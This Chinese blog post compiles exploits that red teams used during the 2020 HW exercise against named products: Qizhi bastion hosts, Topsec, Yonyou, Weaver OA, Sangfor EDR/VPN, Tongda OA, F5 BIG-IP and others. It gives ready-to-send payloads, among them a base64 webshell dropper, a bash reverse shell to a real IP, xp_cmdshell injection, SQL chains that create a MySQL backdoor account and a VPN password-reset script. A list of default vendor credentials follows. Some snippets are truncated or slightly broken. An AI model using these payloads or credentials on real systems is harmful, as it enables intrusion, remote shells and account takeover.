---
title: 2020 HW - 漏洞汇总
date: 2020-10-10 10:54:18
categories:
- Vulnerabilities
- WEB
tags:
- RCE
- SQL Injection
---
## Introduction

&emsp;&emsp;2020年HW期间红队使用的热门漏洞汇总。

<!-- more -->

## Vulnerabilities

### 齐治堡垒机前远程命令执行漏洞 [CNVD-2019-20835]

#### NO.1

&emsp;&emsp;假设10.20.10.10为堡垒机的IP地址。

* 访问`http://10.20.10.11/listener/cluster_manage.php`返回"OK"(未授权无需登录)

* 执行[https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64${IFS}-d|bash`|${IFS}|echo${IFS}](https://10.20.10.10/ha_request.php?action=install&ipaddr=10.20.10.11&node_id=1${IFS}|`echo${IFS}"ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK"|base64${IFS}-d|bash`|${IFS}|echo${IFS})链接即可getshell，执行成功后，生成PHP一句话马`/var/www/shterm/resources/qrcode/lbj77.php`密码`10086`。

![](/img/HW-Vuln/HW1.png)

* 访问地址为`https://10.20.10.10/shterm/resources/qrcode/lbj77.php`(密码`10086`)

#### NO.2

&emsp;&emsp;据说还有另外一个版本是java的：

```
POST /shterm/listener/tui_update.php

a=["t';import os;os.popen('whoami')#"]
```

![](/img/HW-Vuln/HW2.png)

### 天融信 TopApp-LB 负载均衡系统SQL注入漏洞

#### NO.1

&emsp;&emsp;利用POC：

```
POST /acc/clsf/report/datasource.php HTTP/1.1
Host: localhost
Connection: close
Accept: text/javascript, text/html, application/xml, text/xml, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded


t=l&e=0&s=t&l=1&vid=1+union select 1,2,3,4,5,6,7,8,9,substr('a',1,1),11,12,13,14,15,16,17,18,19,20,21,22-- +&gid=0&lmt=10&o=r_Speed&asc=false&p=8&lipf=&lipt=&ripf=&ript=&dscp=&proto=&lpf=&lpt=&rpf=&rpt=@。。
```

![](/img/HW-Vuln/HW3.png)

#### NO.2

&emsp;&emsp;[天融信负载均衡TopApp-LB系统无需密码直接登陆](https://www.uedbox.com/post/21626/)

&emsp;&emsp;用户名随意，密码：`;id`

#### NO.3

&emsp;&emsp;[天融信TopApp-LB负载均衡命令执行漏洞](https://www.uedbox.com/post/22193/)

&emsp;&emsp;用户名: `; ping 9928e5.dnslog.info; echo`，密码任意

![](/img/HW-Vuln/HW4.png)

### 用友 GRP-u8 注入

&emsp;&emsp;利用POC：

```
POST /Proxy HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)
Host: localhost
Content-Length: 341
Connection: Keep-Alive
Cache-Control: no-cache


cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?>
    <R9PACKET version="1">
        <DATAFORMAT>
            XML
        </DATAFORMAT> 
        <R9FUNCTION>
            <NAME>
                AS_DataRequest
            </NAME>
            <PARAMS>
                <PARAM>
                <NAME>
                    ProviderName
                </NAME>
                <DATA format="text">
                    DataSetProviderData
                </DATA>
            </PARAM>
            <PARAM>
            <NAME>
                Data
            </NAME>
            <DATA format="text">
                exec xp_cmdshell 'whoami'
            </DATA>
            </PARAM>
            </PARAMS>
        </R9FUNCTION>
    </R9PACKET>
```

![](/img/HW-Vuln/HW5.png)

### 绿盟 UTS 综合威胁探针管理员任意登录

&emsp;&emsp;逻辑漏洞，利用方式参考：[https://www.hackbug.net/archives/112.html](https://www.hackbug.net/archives/112.html)

* 1、修改登录数据包 {"status":false,"mag":""} -> {"status":true,"mag":""}

* 2、`/webapi/v1/system/accountmanage/account`接口逻辑错误泄漏了管理员的账户信息包括密码（md5）

* 3、再次登录，替换密码上个数据包中md5密码

* 4、登录成功

#### 实际案例

![](/img/HW-Vuln/HW6.png)

&emsp;&emsp;对响应包进行修改，将false更改为true的时候可以泄露管理用户的md5值密码：

![](/img/HW-Vuln/HW7.png)

![](/img/HW-Vuln/HW8.png)

&emsp;&emsp;利用取得的md5值去登录页面：

![](/img/HW-Vuln/HW9.png)

![](/img/HW-Vuln/HW10.png)

### 天融信数据防泄漏系统越权修改管理员密码

&emsp;&emsp;无需登录权限，由于修改密码处未校验原密码，且`/?module=auth_user&action=mod_edit_pwd`，接口未授权访问，造成直接修改任意用户密码，默认superman账户uid为1。

```
POST /?module=auth_user&action=mod_edit_pwd
Cookie: username=superman;


uid=1&pd=Newpasswd&mod_pwd=1&dlp_perm=1
```

### WPS Office 图片解析错误导致堆损坏RCE

&emsp;&emsp;fofa指纹：`title="SANGFOR终端检测响应平台"`。

&emsp;&emsp;漏洞利用：`https://ip/ui/login.php?user=需登录的用户名`。例如`https://1.1.1.1:1980/ui/login.php?user=admin`，查询完毕以后即可登录平台。

### 深信服 EDR 漏洞

&emsp;&emsp;漏洞利用方法：`https://xxx.xxx.xxx/tool/log/c.php?strip_slashes=system&host=whoami`。

![](/img/HW-Vuln/HW11.png)

&emsp;&emsp;网上已经放出批量利用方法了，如[https://github.com/A2gel/sangfor-edr-exploit](https://github.com/A2gel/sangfor-edr-exploit)。

### sangfor EDR RCE漏洞

&emsp;&emsp;利用POC：
```
post /api/edr/sanforinter/v2/cssp/slog_client?token=ssskbkds HTTP/1.1

{"params":"w=123\"'1234123'\"|bash -i >/dev/tcp/167.179.118.219/8899 0>&1"}
```

![](/img/HW-Vuln/HW12.png)

![](/img/HW-Vuln/HW13.png)

### 联软科技产品存在任意文件上传和命令执行漏洞

&emsp;&emsp;任意文件上传漏洞，存在于用户自检报告上传时，后台使用黑名单机制对上传的文件进行过滤和限制，由于当前黑名单机制存在缺陷，文件过滤机制可以被绕过，导致存在文件上传漏洞；利用该漏洞可以获取webshell权限。

&emsp;&emsp;命令执行漏洞，存在于后台资源读取过程中，对于自动提交的用户可控参数没有进行安全检查，可以通过构造特殊参数的数据包，后台在执行过程中直接执行了提交数据包中的命令参数，导致命令执行漏洞；该漏洞能够以当前运行的中间件用户权限执行系统命令，根据中间件用户权限不同，可以进行添加系统账户，使用反弹shell等操作。

### 泛微OA Bsh 远程代码执行漏洞

&emsp;&emsp;2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁，泛微e-cology OA系统的Java Beanshell接口可被未授权访问，攻击者调用该Beanshell接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行，漏洞等级严重。

&emsp;&emsp;利用POC：

```
POST /weaver/bsh.servlet.BshServlet HTTP/1.1
Host: xxxxxxxx:8088
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Length: 98
Content-Type: application/x-www-form-urlencoded


bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
```

&emsp;&emsp;`eval%00("ex"%2b"ec(\"whoami\")");`也可以换成`ex\u0065c("cmd /c dir");`。 

&emsp;&emsp;[CNVD-2019-32204利用脚本](https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204)。

### 泛微OA e-cology SQL注入漏洞

&emsp;&emsp;[泛微OA WorkflowCenterTreeData接口注入漏洞(限oracle数据库)](https://xz.aliyun.com/t/6531)。

&emsp;&emsp;漏洞利用：修改NULL后为要查询的字段名，修改from后为查询的表。

```
POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333 HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 2236
Connection: close
Upgrade-Insecure-Requests: 1


formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0 d%0a%0d%0a%0
```

![](/img/HW-Vuln/HW14.png)

### 深信服 VPN 远程代码执行

&emsp;&emsp;深信服vpnweb登录逆向学习：`https://www.cnblogs.com/potatsoSec/p/12326356.html`

&emsp;&emsp;漏洞利用：`wget -t %d -T %d --spider %s`

### 深信服 VPN 口令爆破

&emsp;&emsp;[关于SSL VPN认证时的验证码绕过](https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=20633)。

### 常见边界产品(防火墙, 网关, 路由器, VPN) 弱口令漏洞

&emsp;&emsp;各厂商防火墙登录IP、初始密码、技术支持：`https://mp.weixin.qq.com/s/OLf7QDl6qcsy2FOqCQ2icA`。

### Thinkphp 相关漏洞

&emsp;&emsp;Thinkphp是国内很常见的PHP框架，存在远程代码执行/sql注入/反序列化/日志文件泄露等问题。

* [ThinkPHP漏洞总结](http://zone.secevery.com/article/1165)

* [挖掘暗藏ThinkPHP中的反序列利用链](https://blog.riskivy.com/%E6%8C%96%E6%8E%98%E6%9A%97%E8%97%8Fthinkphp%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%88%A9%E7%94%A8%E9%93%BE/)

* [ThinkPHP使用不当可能造成敏感信息泄露](https://blog.csdn.net/Fly_hps/article/details/81201904)

* [DSMall代码审计](https://www.anquanke.com/post/id/203461)

&emsp;&emsp;漏洞利用：

* [thinkphp v5.x 远程代码执行漏洞-POC集合](https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection)

* [thinkphp反序列化漏洞复现及POC编写](https://github.com/Dido1960/thinkphp)

* [Thinkphp3/5 Log文件泄漏利用工具](https://github.com/whirlwind110/tphack)

### Spring 系列漏洞

&emsp;&emsp;Spring是java web里最最最最常见的组件了，自然也是研究的热门，好用的漏洞主要是Spring Boot Actuators反序列化。

* [Spring 框架漏洞集合](https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/)

* [Exploiting Spring Boot Actuators | Veracode blog](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

* [Spring Boot Actuators配置不当导致RCE漏洞复现](https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/)

&emsp;&emsp;漏洞利用：

* [Spring Boot Actuator (jolokia) XXE/RCE](https://github.com/mpgn/Spring-Boot-Actuator-Exploit)

* [A tiny project for generating SnakeYAML deserialization payloads](https://github.com/artsploit/yaml-payload)

### Solr 系列漏洞

&emsp;&emsp;Solr是企业常见的全文搜索服务，这两年也爆出很多安全漏洞。

* [Apache Solr最新RCE漏洞分析](https://www.freebuf.com/vuls/218730.html)

* [Apache Solr DataImportHandler远程代码执行漏洞(CVE-2019-0193)分析](https://paper.seebug.org/1009/)

&emsp;&emsp;漏洞利用：

* [Apache Solr Injection Research](https://github.com/veracode-research/solr-injection)

* [Apache Solr RCE (ENABLE_REMOTE_JMX_OPTS=”true”)](https://github.com/jas502n/CVE-2019-12409)

* [MOGWAI LABS JMX exploitation toolkit](https://github.com/mogwailabs/mjet)

### Ghostscript 上传图片代码执行

&emsp;&emsp;Ghostscript是图像处理中十分常用的库，集成在imagemagick等多个开源组件中，其`.ps`文件存在沙箱绕过导致代码执行的问题影响广泛，由于上传图片就有可能代码执行，很多大厂中招。

&emsp;&emsp;[ghostscript命令执行漏洞预警](https://www.anquanke.com/post/id/157513)。

&emsp;&emsp;漏洞利用：

* [Exploit Database Search](https://www.exploit-db.com/search?q=Ghostscript)

* [CVE-2019-6116](https://github.com/vulhub/vulhub/tree/master/ghostscript/CVE-2019-6116)

&emsp;&emsp;如果发现网站可以上传图片，且图片没有经过裁剪，最后返回缩略图，这里就可能存在Ghostscript上传图片代码执行dnslog可以用ping `uname`.admin.ceye.io或ping `whoami`.admin.ceye.io保存成图片，以后用起来方便，有个版本的centos和ubuntu poc还不一样，可以这样构造ping `whoami`.centos.admin.ceye.io / ping `whoami`.ubuntu.admin.ceye.io分别命名为centos_ps.jpg/ubuntu_ps.jpg，这样测试的时候直接传2个文件，通过DNSLOG可以区分是哪个poc执行的。

### 泛微云桥任意文件读取漏洞

* `http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt`

* `http://www.xxx.com/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt` 

### 网瑞达 WebVPN RCE 漏洞

&emsp;&emsp;WebVPN是提供基于web的内网应用访问控制，允许授权用户访问只对内网开放的web应用，实现类似VPN（虚拟专用网）的功能。

### Apache DolphinScheduler 高危漏洞 [CVE-2020-11974、CVE-2020-13922]

&emsp;&emsp;CVE-2020-11974与mysql connectorj远程执行代码漏洞有关，在选择mysql作为数据库时，攻击者可通过`jdbc connect`参数输入`{“detectCustomCollations”:true，“ autoDeserialize”:true}`在 DolphinScheduler 服务器上远程执行代码。

&emsp;&emsp;CVE-2020-13922导致普通用户可通过api interface在DolphinScheduler 系统中覆盖其他用户的密码：`api interface /dolphinscheduler/users/update`。

&emsp;&emsp;受影响版本：Apache DolphinScheduler = 1.2.0、1.2.1、1.3.1

&emsp;&emsp;利用POC：

```
POST /dolphinscheduler/users/update

id=1&userName=admin&userPassword=Password1!&tenantId=1&email=sdluser%40sdluser.sdluser&phone=
```

![](/img/HW-Vuln/HW15.png)

&emsp;&emsp;利用漏洞需要登录权限，提供一组默认密码。该漏洞存在于数据源中心未限制添加的jdbc连接参数,从而实现JDBC客户端反序列化。

&emsp;&emsp;1、登录到面板 -> 数据源中心。

![](/img/HW-Vuln/HW16.png)

&emsp;&emsp;2、jdbc连接参数就是主角，这里没有限制任意类型的连接串参数。

![](/img/HW-Vuln/HW17.png)

&emsp;&emsp;3、将以下数据添加到jdbc连接参数中，就可以直接触发。

![](/img/HW-Vuln/HW18.png)

&emsp;&emsp;[关于MySQL JDBC客户端反序列化漏洞的相关参考](https://www.anquanke.com/post/id/203086)。

### 宝塔面板 phpMyadmin 未授权访问

&emsp;&emsp;宝塔默认phpMyadmin端口就是888，而这个漏洞排查方式极其简单，访问`172.10.0.121:888/pma`。如果宝塔是存在安全问题的版本,那就会直接出现phpMyadmin面板页面。

### Exchange Server 远程代码执行漏洞 [CVE-2020-16875]

&emsp;&emsp;只需要一个Exchange用户账号，就能在Exchange服务器上执行任意命令。

### PhpStudy nginx 解析漏洞

&emsp;&emsp;小皮面板 <= 8.1.0.7，其实这个漏洞确实不是phpstudy的问题，而是2017年就出现的nginx解析漏洞。

&emsp;&emsp;利用条件就只需要把php恶意文件上传（oss不算!）到服务器。通过`/x.txt/x.php`方式访问上传的图片地址就解析了php代码。

![](/img/HW-Vuln/HW19.png)

### Apache Cocoon XML注入 [CVE-2020-11991]

&emsp;&emsp;程序使用了StreamGenerator这个方法时，解析从外部请求的xml数据包未做相关的限制，恶意用户就可以构造任意的xml表达式，使服务器解析达到XML注入的安全问题。

&emsp;&emsp;漏洞利用条件有限必须是apacheCocoon且使用了StreamGenerator，也就是说只要传输的数据被解析就可以实现了。

&emsp;&emsp;利用POC：

```XML
<!--?xml version="1.0" ?-->

<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>

<userInfo>

<firstName>John</firstName>

<lastName>&ent;</lastName>

</userInfo>

```

![](/img/HW-Vuln/HW20.png)

### Horde Groupware Webmail Edition 远程命令执行

&emsp;&emsp;来源: `https://srcincite.io/pocs/zdi-20-1051.py.txt`。

### 通达OA任意用户登录

* 1、首先访问`/ispirit/login_code.php`获取`codeuid`

* 2、访问`/general/login_code_scan.php`提交 post 参数：`uid=1&codeuid={9E908086-342B-2A87-B0E9-E573E226302A}`

![](/img/HW-Vuln/HW21.png)

* 3、最后访问`/ispirit/login_code_check.php?codeuid=xxx`，这样`$_SESSION`里就有了登录的信息了。

### 通达OA v11.7 后台SQL注入

&emsp;&emsp;利用条件：需要登录权限。

&emsp;&emsp;`/general/hr/manage/query/delete_cascade.php?condition_cascade=select%20if((substr(user(),1,1)=%27r%27),1,power(9999,99))`

&emsp;&emsp;利用链示例：

* 1、添加一个mysql用户：`grant all privileges ON mysql.* TO 'ateam666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION`

![](/img/HW-Vuln/HW22.png)

* 2、给创建的ateam666账户添加mysql权限

```
UPDATE `mysql`.`user` SET `Password` = '*DE0742FA79F6754E99FDB9C8D2911226A5A9051D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Up
```

* 3、刷新数据库就可以登录到数据库：`/general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;`

* 4、通达OA配置mysql默认是不开启外网访问的所以需要修改mysql授权登录：`/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql.* TO 'ateam666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION`

* 5、接下来就是mysql提权

### Wordpress File-manager 插件任意文件上传

![](/img/HW-Vuln/HW23.png)

&emsp;&emsp;成功上传后文件访问路径：`/wordpress/wp-content/plugins/wp-file-manager/lib/files/shell.php`

### Pligg CMS远程代码执行 [CVE-2020-25287]

&emsp;&emsp;漏洞非常鸡肋需要登录后台，受影响版本为Pligg2.0.3。

![](/img/HW-Vuln/HW24.png)

&emsp;&emsp;模版编辑器功能可以编辑任意文件内容，在文件中加入恶意代码导致代码执行。

![](/img/HW-Vuln/HW25.png)

### ZeroLogon接管域控权限漏洞 [CVE-2020-1472]

&emsp;&emsp;Netlogon远程协议是一个远程过程调用（RPC）接口，用于基于域的网络上的用户和计算机身份验证。Netlogon远程协议RPC接口还用于为备份域控制器（BDC）复制数据库。

&emsp;&emsp;Netlogon远程协议用于维护从域成员到域控制器（DC），域的DC之间以及跨域的DC之间的域关系。此RPC接口用于发现和管理这些关系。

&emsp;&emsp;该漏洞主要是由于在使用Netlogon安全通道与域控进行连接时，由于认证协议加密部分的缺陷，导致攻击者可以将域控管理员用户的密码置为空，从而进一步实现密码hash获取并最终获得管理员权限。成功的利用可以实现以管理员权限登录域控设备，并进一步控制整个域。

&emsp;&emsp;漏洞影响：

* Microsoft Windows Server 2008 R2 SP1

* Microsoft Windows Server 2012

* Microsoft Windows Server 2012 R2

* Microsoft Windows Server 2016

* Microsoft Windows Server 2019

* Microsoft Windows Server version 2004 (Server Core Installation)

* Microsoft Windows Server version 1903 (Server Core Installation)

* Microsoft Windows Server version 1909 (Server Core Installation) 

### ThinkAdminV6 任意文件操作

&emsp;&emsp;目录遍历，注意POST数据包rules参数值需要URL编码。

```
POST /admin.html?s=admin/api.Update/node

rules=%5B%22.%2F%22%5D
```

![](/img/HW-Vuln/HW26.png)

&emsp;&emsp;文件读取，后面那一串是UTF8字符串加密后的结果。计算方式在Update.php中的加密函数。

&emsp;&emsp;`/admin.html?s=admin/api.Update/get/encode/34392q302x2r1b37382p382x2r1b1a1a1b1a1a1b2r33322u2x2v1b2s2p382p2q2p372t0y342w34`

![](/img/HW-Vuln/HW27.png)

### SharePoint远程代码执行 [CVE-2020-1181]

&emsp;&emsp;漏洞详情及利用方法见`https://www.anquanke.com/post/id/208819`

### 深信服 SSL VPN 任意密码重置

&emsp;&emsp;深信服VPN加密算法使用了默认的key，攻击者构利用key构造重置密码数据包从而修改任意用户的密码。利用条件需要登录账号。M7.6.6R1版本默认key为20181118，M7.6.1版本默认key为20100720。

```Python
from Crypto.Clipher import ARC4
from binascii import a2b_hex

def	myRC4(data,key):
    rc41=ARC4.new(key)
    encrypted=rc41.encrypt(data)
    return encrypted.encode('hex')

def rc4_decrpt_hex(data,key):
    rc41=ARC4.new(key)
    return rc41.decrypt(a2b_hex(data))
 
key='20200720'
data=r',username=TARGET_USERNAME,ip=127.0.0.1,grpid=1,pripsw=suiyi,newpsw=TARGET_PASSWORD,' 
print myRC4(data,key)
```

![](/img/HW-Vuln/HW28.png)

![](/img/HW-Vuln/HW29.png)

&emsp;&emsp;len为脚本计算后的结果。

### 深信服 SSL VPN 修改任意账户手机号

&emsp;&emsp;修改手机号接口未正确鉴权导致越权覆盖任意用户的手机号码，利用条件需要登录账号。

```
https://<PATH>/por/changetelnum.csp?apiversion=1

newtel=TARGET_PHONE&sessReq=clusterd&username=TARGET_USERNAME&grpid=0&sessid=0&ip=127.0.0.1
```

![](/img/HW-Vuln/HW30.png)

### 通达OA v11.6 版本RCE漏洞

* `https://www.cnblogs.com/yuzly/p/13600532.html`

* `https://github.com/TomAPU/poc_and_exp`

### F5负载均衡 RCE [CVE-2020-5902]

&emsp;&emsp;版本影响：

* BIG-IP 15.x: 15.1.0/15.0.0

* BIG-IP 14.x: 14.1.0 ~ 14.1.2

* BIG-IP 13.x: 13.1.0 ~ 13.1.3

* BIG-IP 12.x: 12.1.0 ~ 12.1.5

* BIG-IP 11.x: 11.6.1 ~ 11.6.5

&emsp;&emsp;远程命令执行RCE：`curl -v -k 'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'`

![](/img/HW-Vuln/HW31.png)

![](/img/HW-Vuln/HW32.png)

![](/img/HW-Vuln/HW33.png)

&emsp;&emsp;文件包含漏洞：`https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd`

![](/img/HW-Vuln/HW34.png)

### fastadmin 前台 getshell + csrf + xss

#### NO.1

&emsp;&emsp;需要开启会员中心功能为利用前提条件。登陆会员中心，在个人资料页面中修改个人头像：

![](/img/HW-Vuln/HW35.png)

&emsp;&emsp;抓包后修改图片数据（满足图片头格式即可）：

![](/img/HW-Vuln/HW36.png)

&emsp;&emsp;记录下路径后，成功getshell：

![](/img/HW-Vuln/HW37.png)

#### NO.2

&emsp;&emsp;后台分类管理处存在XSS：

```
POST /admin.php/category/add?dialog=1 HTTP/1.1
Host: admin.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 233
Origin: http://admin.com
Connection: close
Referer: http://admin.com/admin.php/category/add?dialog=1
Cookie: PHPSESSID=ou6fjfn717lu02rfm9saqguca4; uid=3; token=f824ac8c-ac7b-4979-a89b-b47dd8e79226


row%5Btype%5D=default&row%5Bpid%5D=0&row%5Bname%5D=%3Cscript%3Ealert(1)%3C%2Fscript%3E&row%5Bnickname%5D=123&row%5Bimage%5D=1&row%5Bkeywords%5D=123&row%5Bde
```

![](/img/HW-Vuln/HW38.png)

#### NO.3

&emsp;&emsp;还存在CSRF漏洞：

```HTML
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="http://admin.com/admin.php/category/add?dialog=1" method="POST"> <input type="hidden" name="row&#91;type&#93;" value="default" />
<input type="hidden" name="row&#91;pid&#93;" value="0" />
<input type="hidden" name="row&#91;name&#93;" value="&lt;script&gt;alert&#40;1&#41;&lt;&#47;script&gt;" /> <input type="hidden" name="row&#91;nickname&#93;" value="123" /> <input type="hidden" name="row&#91;image&#93;" value="1" />
<input type="hidden" name="row&#91;keywords&#93;" value="123" />
<input type="hidden" name="row&#91;description&#93;" value="123" />
<input type="hidden" name="row&#91;weigh&#93;" value="0" />
<input type="hidden" name="row&#91;status&#93;" value="normal" />
<input type="hidden" name="row&#91;flag&#93;&#91;&#93;" value="" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
```

## Appendix

&emsp;&emsp;一些弱口令字典:

* 泛微OA默认system账号:system/system

* Apache DolphinScheduler:admin/dolphinscheduler

* 天融信防火墙 用户名:superman 密码:talent

* 天融信防火墙 用户名:superman 密码:talent!23

* 联想网御防火墙 用户名:admin 密码:leadsec@7766、administrator、bane@7766

* 深信服防火墙 用户名:admin 密码:admin

* 启明星辰 用户名:admin 密码:bane@7766、admin@123

* juniper 用户名:netscreen 密码:netscreen

* Cisco 用户名:admin 密码:cisco

* Huawei 用户名:admin 密码:Admin@123

* H3C 用户名:admin 密码:admin

* 绿盟IPS 用户名:weboper 密码:weboper

* 网神防火墙GE1 用户名:admin 密码:firewall

* 深信服VPN:51111端口	密码:delanrecover

* 华为VPN 账号:root 密码:mduadmin

* 华为防火墙 账号:admin	密码:Admin@123

* 迪普 192.168.0.1 默认的用户名和密码(admin/admin_default)

* 山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone

* 安恒的明御防火墙 admin/adminadmin

* 某堡垒机 shterm/shterm

* 天融信的vpn test/123456

* sysauditor/sysauditor

* sysmanager/sysmanager

* supervisor/supervisor

* maintainer/maintainer

* webpolicy/webpolicy

* sysadmin/sysadmin

* conadmin/conadmin

* supervis/supervis

* webaudit/webaudit

* sysadmin/sysadmin

* conadmin/nsfocus

* weboper/weboper

* auditor/auditor

* weboper/weboper

* nsadmin/nsadmin

* admin/nsfocus

* admin/admin

* shell/shell
